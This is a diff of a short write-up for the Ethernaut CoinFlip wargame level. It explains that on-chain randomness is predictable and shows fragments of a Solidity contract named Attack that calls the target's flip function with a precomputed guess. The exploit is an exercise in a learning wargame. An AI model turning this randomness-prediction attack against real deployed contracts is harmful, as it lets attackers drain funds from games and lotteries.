@@ -1,6 +1,10 @@
-level_4_flipcoin
-same as telephone calculate the randomvalue and again call the original flipcoin flip function
-because blockchain cannot produce true random number
+# Ethernaut Level 4 FlipCoin
+It can be solved same as telephone calculate the randomvalue and again call the original flipcoin flip function.
+why?
+blockchain randomness is not true random.we can manipulate it by using tools.
+
+# Code
+```soldity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -24,4 +28,5 @@ contract Attack {
         flipCoin.flip(guess);
     }
 }
+```
 
